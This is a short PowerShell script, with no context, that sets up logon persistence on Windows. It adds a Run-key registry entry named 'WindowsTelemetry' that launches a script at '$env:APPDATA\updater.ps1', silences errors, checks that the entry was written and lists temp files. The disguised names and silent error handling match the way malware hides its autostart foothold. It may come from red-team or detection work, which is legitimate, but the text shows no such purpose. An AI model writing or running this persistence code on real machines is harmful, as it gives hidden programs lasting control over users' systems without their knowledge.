
[CmdletBinding()]
param(
    [string]$PersistencePath = "$env:APPDATA\updater.ps1",
    [string]$RegistryValue = "WindowsTelemetry"
)
New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $RegistryValue -Value $PersistencePath -PropertyType String -Force -ErrorAction SilentlyContinue
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RegistryValue -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
